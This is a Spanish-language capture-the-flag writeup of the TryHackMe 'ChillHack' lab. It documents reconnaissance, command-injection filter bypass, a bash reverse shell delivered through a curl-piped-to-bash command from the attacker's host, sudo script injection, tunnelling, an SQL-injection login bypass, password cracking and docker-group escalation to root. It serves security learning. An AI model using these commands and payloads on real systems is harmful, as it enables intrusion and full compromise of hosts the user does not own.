---
layout: single
title: "ChillHack - Try Hack Me"
excerpt: "Este writeup detalla el proceso que se llevo a cabo para hackear la maquina objetivo llamada ChillHack de TryHackMe. Tiene un sitio web el cual tiene diferentes vulnerabilidades que se pueden explotar para comprometer el sistema. Intentando despues con movimientos lateral poder acceder a usuarios del servido para poder ganar acceso con altos privilegios. Utilizando diferentes herramientas y tecnicas de hacking incluyendo nmap, gobuster, whatweb, netcat."
date: 2023-01-08
classes: wide
header:
 teaser: /assets/images/chillHack/chillHack.png
 teaser_home_page: true
 icon: /assets/images/thm.webp
categories:
  - CTF
  - Free
tags:
  - security
  - hacking web
  - command injection
  - sql injection
---

![](/assets/images/chillHack/chillHack.png)

## Introduccion

Este writeup detalla el proceso que se llevo a cabo para hackear la maquina objetivo llamada "ChillHack" de TryHackMe. Tiene un sitio web el cual tiene diferentes vulnerabilidades que se pueden explotar para comprometer el sistema. Intentando despues con movimientos lateral poder acceder a usuarios del servido para poder ganar acceso con altos privilegios. Utilizando diferentes herramientas y tecnicas de hacking incluyendo `nmap, gobuster, whatweb, netcat`.

## Escaneo

Para empezar con esta parte del proceso, de primeras lance un ping a la IP objetivo para saber un poco de información que nos puede ser de ayuda.

### Barrido de ping

Con el fin de revisar el TTL (Time To Live) de la maquina objetivo y tambien saber si esta encendida o apagada la maquina, porque si el TTL esta cerca o es 64 eso indica que estamos frente a una maquina Linux y si hay un TTL aproximado o igual a 127, eso diria que la maquina es una Windows.

```
> ping -c 1 10.10.73.28
PING 10.10.73.28 (10.10.73.28) 56(84) bytes of data.
64 bytes from 10.10.73.28: icmp_seq=1 ttl=61 time=351 ms

--- 10.10.73.28 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 1ms
rtt min/avg/max/mdev = 351.097/351.097/351.097/0.000 ms
```

Como recibi el paquete, eso me dice de primera que la maquina objetivo esta encendida y por el TTL ya me indicaba que estamos frente a un sistema Linux.

### Escaneo de puertos TCP

Aqui realice un escaneo a todos los puertos en la maquina objetivo para tener idea de lo que esta corriendo en esta maquina. Utilizando como herramienta a `nmap` y como comando use el siguiente, con el fin de realizar un escaneo exhaustivo a todo el rango de puerto que son 65535 y con las respectivas versiones y servicios que corren en los puertos que vaya encontrando.

`nmap -p- --open -sS --min-rate 5000 -n -Pn -v -oN <name_file> <ip_victim>`

```
   1   │ # Nmap 7.92 scan initiated Thu Dec 29 16:48:36 2022 as: nmap -sCV -p21,22,80 -oN targeted 10.10.73.28
   2   │ Nmap scan report for 10.10.73.28
   3   │ Host is up (0.20s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 3.0.3
   7   │ | ftp-syst: 
   8   │ |   STAT: 
   9   │ | FTP server status:
  10   │ |      Connected to ::ffff:10.6.11.19
  11   │ |      Logged in as ftp
  12   │ |      TYPE: ASCII
  13   │ |      No session bandwidth limit
  14   │ |      Session timeout in seconds is 300
  15   │ |      Control connection is plain text
  16   │ |      Data connections will be plain text
  17   │ |      At session startup, client count was 3
  18   │ |      vsFTPd 3.0.3 - secure, fast, stable
  19   │ |_End of status
  20   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  21   │ |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
  22   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  23   │ | ssh-hostkey: 
  24   │ |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
  25   │ |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
  26   │ |_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
  27   │ 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  28   │ |_http-title: Game Info
  29   │ |_http-server-header: Apache/2.4.29 (Ubuntu)
  30   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  31   │ 
  32   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  33   │ # Nmap done at Thu Dec 29 16:48:58 2022 -- 1 IP address (1 host up) scanned in 22.13 seconds
```

De los resultados, pude ver que la maquina tiene 3 puertos abiertos que son el FTP en el puerto 21, el puerto 22 con el servicio SSH y el puerto 80 con el servicio HTTP, el escaneo me dio una idea de por donde empezar con la enumeración.

## Enumeración

### FTP

Primeramente en el escaneo nos dice que el puerto ftp esta abierto con login de usuario "Anonymous" por lo que hice la conexion a ese servicio y descargarme lo que hay.

```
> ftp 10.10.3.17
Connected to 10.10.3.17.
220 (vsFTPd 3.0.3)
Name (10.10.3.17:cybersecco): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (23.3690 kB/s)
ftp> exit
221 Goodbye.
```

Ya despues de descargado el archivo lo abro y veo lo siguiente:

```
> cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

### HTTP

Eso me dio una pista, que me dice que hay filtrado en las cadenas que se ponen en el comando. Aqui ya empeze a enumerar mas a fondo el sistema y los servicios que se estaban corriendo. Como el puerto 80 esta abierto, accedí a el, para revisar el contenido en la web.

![](/assets/images/chillHack/2023-01-09_11-04.png)

### Go Buster

Un Sitio Web que no dice gran cosa porque si pasaba el raton por los botones y enlaces, el sitio no lleva a rutas diferentes o raras. Entonces lo que pase a realizar fue un fuzzing de directorios a la ruta `http://<IP Objetivo>/` utilizando la herramienta Go Buster.

Comando para realizar el escaneo.

```
gobuster dir -u http://10.10.73.22 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --no-error
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.3.17
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/09 11:10:26 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://10.10.3.17/images/]
/css                  (Status: 301) [Size: 306] [--> http://10.10.3.17/css/]   
/js                   (Status: 301) [Size: 305] [--> http://10.10.3.17/js/]    
/fonts                (Status: 301) [Size: 308] [--> http://10.10.3.17/fonts/] 
/secret               (Status: 301) [Size: 309] [--> http://10.10.3.17/secret/]
Progress: 8858 / 220561 (4.02%)                                               
[!] Keyboard interrupt detected, terminating.
                                                                               
===============================================================
2023/01/09 11:10:46 Finished
===============================================================
```

En el escaneo vi un directorio algo sospecho por su nombre y es "/secret".

## Explotación

En la enumeración, descubrí un directorio llamado secret, entonces lo busque en la web y me mando a otra pagina diferente a la que estaba, aqui supuse que si colocaba algun comando lo iba a ejecutar, por como se ve todo.

![](/assets/images/chillHack/2023-01-09_11-13.png)

De primeras probe con el comando `ls` para listar lo que hay en el directorio y al darle ejecutar me mostro el siguiente aviso.

![](/assets/images/chillHack/2023-01-09_11-14.png)

Utilice otros comandos como `ifconfig` o `hostname -I`, y estos comandos si permitio ejecutarlos. Antes en la enumeracion revise un archivo `note.txt` donde me daba un pista sobre filtrado en la cadena de un comando, por lo que al parecer existe alguna sanitización en el codigo fuente y me dio una idea de que hacer, volver al lanzar el comando de forma diferente.

![](/assets/images/chillHack/2023-01-09_11-17.png)

Usando un escapado `\`  me permitio ejecutar los comandos que anteriormente no dejaba, al lanzar el comando `ls` listo un archivo .php, asi que pase a revisar ese archivo con el comando cat escapandolo.

Ejecutando el comando de esta forma `c\at index.php`.

![](/assets/images/chillHack/2023-01-09_11-18.png)

En este punto yo veo algo diferente a la pagina anterior, por lo que me causo curiosidad, entonces pase a revisar el codigo fuente, teclando ctrl + u  y al revisar el codigo, se ve un codigo PHP que anteriormente no se veia.

![](/assets/images/chillHack/2023-01-09_11-21.png)

Ahora se puede ver la sanitizacion que se le hizo a la pagina, ya sabiendo eso y sabiendo como escapar los comando sanitizados, puedo intentar crear un archivo en php con una reverse shell en bash y con un comando que se le pasara desde la pagina, ejecutarlo y asi ganar acceso desde consola al servidor.

Creé primero un archivo `shell.sh` con una linea de comando de una reverse shell en bash en mi maquina.

```
bash -c "bash -i >& /dev/tcp/<IP Atacante>/<port> 0>&1"
```

Tambien monte un servidor en mi maquina para poder cargar el archivo `shell.sh`.

```
python3 -m http.server 8080
```

Y en otra ventana de mi maquina monte un netcat de escucha para recibir una shell del objetivo.

```
nc -nlvp 6666
```

En este punto, ya tenia listo el netcat y el servidor con el archivo creado, asi que ejecute el comando desde la pagina para que por detras desde consola pudiera obtener la shell esperada mediante el netcat de escucha.

```
curl http://10.4.11.19:8080/shell.sh | b\ash
```

![](/assets/images/chillHack/2023-01-09_11-32.png)

Y si todo sale bien, por detras con netcat obtengo la shell del servidor.

```
listening on [any] 6666 ...
connect to [10.6.11.19] from (UNKNOWN) [10.10.3.17] 59200
bash: cannot set terminal process group (1086): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/secret$
```

## Acceso

Teniendo esta Reverse Shell procedi a realizar un tratamiento de la tty para poder operar de una forma mas limpia y asi tambien para no perder la shell generada. 

En este enlace estan los comandos del paso a paso para realizar el tratamiento de la shell y obtener una shell mas estable [Tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/#).

Empece revisando la direccion IP asignada con el comando `hostname -I`.

```
www-data@ubuntu:/var/www/html/secret$ hostname -I 
hostname -I
10.10.3.17 172.17.0.1 
www-data@ubuntu:/var/www/html/secret$
```

Esta interesante esa otra IP interna, pero de primeras no la revise, seguí lanzando comandos para ver mas informacion.

```
www-data@ubuntu:/var/www/html/secret$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```
```
www-data@ubuntu:/var/www/html/secret$ ls /home
anurodh  apaar  aurick
www-data@ubuntu:/var/www/html/secret$
```

Aqui ya pude notar que existen 3 usuarios en la maquina objetivo.

Luego lance un comando para ver que puertos podrian estar abiertos internamente, el comando es el siguiente `netstat -tplug`.

```
www-data@ubuntu:/var/www/html/secret$ netstat -tplug
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:9001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -                   
udp        0      0 localhost:domain        0.0.0.0:*                           -                   
udp        0      0 ip-10-10-3-17.eu:bootpc 0.0.0.0:*                           -                   
IPv6/IPv4 Group Memberships
Interface       RefCnt Group
--------------- ------ ---------------------
lo              1      all-systems.mcast.net
eth0            1      all-systems.mcast.net
docker0         1      all-systems.mcast.net
lo              1      ip6-allnodes
lo              1      ff01::1
eth0            1      ff02::1:ffac:3b5d
eth0            2      ip6-allnodes
eth0            1      ff01::1
docker0         1      ip6-allnodes
docker0         1      ff01::1
www-data@ubuntu:/var/www/html/secret$
```

Este resultado me mostro que existe un puerto abierto internamente en el localhost. Despues reviso esta parte que seria otra posible via de acceso.

Por ultimo use el comando `sudo -l` para listar los binarios ejecutables con sudo y el resultado me mostro que podria ejecutar un script llamado `helpline.sh` como un usuario diferente sin conocer las contraseñas del usuario.

```
www-data@ubuntu:/var/www/html/secret$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ubuntu:/var/www/html/secret$
```

En este punto lo que hice fue analizar el archivo .sh y ver de que trataba.

```
www-data@ubuntu:/var/www/html/secret$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

Lo que se ve en el script es que con este binario es posible inyectar un comando y aprovecharnos de el para nuestro beneficio y obtener una shell con el usuario Apaar. Entonces use el comando con el usuario apaar de la siguiente manera:

```
sudo -u apaar /home/apaar/.helpline.sh
```

```
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
Hello user! I am test,  Please enter your message: /bin/bash
```

Aqui le pasamos un nombre cualquiera y como mensaje le pedimos ejecutar una `/bin/bash` y ya teniendo acceso a la bash con usuario apaar, busco para obtener la flag de usuario pedida por TryHackMe.

- imagen

En este punto, antes habia visto el puerto 9001 abierto pero de forma interna en el local host, por lo que hay dos formas de poder realizar un tunel inverso, ya sea con SSH o usando el binario Chisel y poder ver lo que hay en ese puerto.

### Con SSH

Con SSH cree un par de claves SSH para montar una en el servidor y usar el servicio SSH para hacer un tunel inverso del puerto al que quiero acceder que es el `9001`.

Use el binario `ssh-keygen` de Linux para crear las llaves, y el comando que ejecute es el siguiente:

```
ssh-keygen -f <name_file>
```

- imagen

Este comando me creo una clave publica y una privada, lo cual la llave publica la copie y la pegue en el archivo `authorized_keys`  que esta alojado en el directorio /.ssh en el directorio del usuario Apaar.

- imagen

A la clave privada que creé le adjunto los permiso `600` con el siguiente comando `chmod 600 <name_file>`.

- imagen

Teniendo esto use el siguiente comando para crear el tunel inverso al puerto que quiero ingresar. aqui el comando que use.

```
ssh -L <port>:127.0.0.1:<port> -i <name_file> <user>@<IP objetivo>
```

- imagen

Ahora pasare abrir el puerto desde la web a ver que hay.

- imagen

En el puerto interno encontre un panel de control pero no tengo credenciales para acceder a el.

### Con Chisel

Con chisel tambien puedo montar un tunel inverso para revisar el puerto interno.

Para usar chisel debo tener dos copias del binario, uno en la maquina objetivo y otro en la maquina del atacante.

Monte un servidor desde mi maquina de atacante.

- imagen

Ahora monto un cliente desde la maquina objetivo.

- imagen

Reviso si se da la conexion del lado del servidor.

- imagen

Listo por lo tanto pase a revisar tambien la web.

- imagen

En este punto que vi un panel de inicio de sesion pase a utilizar una tipica injection SQL `' OR 1=1-- -` y una contraseña cualquiera.

- imagen

Me abrio esta pagina `/hacker.php`.

- imagen

En este punto me dio una pista, diciendo que mire en la oscuridad, por lo que me causa curiosidad y me descargo la imagen.

- imagen

### Steg Hide

Haciendo uso de esta herramienta le pase el parametro info para que me arroje informacion acerca de la imagen y me mostro que hay un archivo .zip por lo que pase a extraerlo de la imagen.

- imagen

Y para extraerlo use el siguiente comando:

```
steghide extract -sf <name_img>
```

- imagen

Con el comando unzip podemos extraer lo del archivo `.zip`.

- imagen

Al unzipiar el archivo me pide una contraseña que aun no se por lo que usare la herramienta de jhon para archivos `.zip`.

Este es el comando que use para generar un hash para luego romper con john y su fuerza bruta.

```
zip2john backup.zip > hash
```

- imagen

Ahora teniendo ese hash pasare a usar john y mirar con un diccionario de contraseñas a ver si me da la contraseña crakeada. Utilce el siguiente comando de john.

```
john <name_hash> --wordlist=<directory_pass>
```

- imagen

Me descomprimio un archivo llamado `source-code.php`, pase a revisarlo y me encuentro con una contraseña en base 64 y el usuario Anurodh.

- imagen

Decodificamos la contraseña en base64:

- imagen

Teniendo esto en cuenta pude realizar un movimiento lateral al usuario Anurodh con la contraseña dada.

- imagen

## Escalada de privilegios

Efectivamente me pase a otro usuario de esta maquina objetivo por lo que como siempre, lanzo el como id a ver en que grupos se encuentra este usuario.

- imagen

Veo que esta en el grupo docker por lo que si esta en esta grupo puedo aprovecharme de este grupo para iniciar una instancia ya que inmediatamente se cargar un chroot, dandome efectivamente una shell con root.

Haciendo uso de la pagina de https://gtfobins.github.io buscando por docker shell, me muestra el comando para usar y poder generar una shell con usuario Root.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Y este comando me dio los privilegios de root. 

- imagen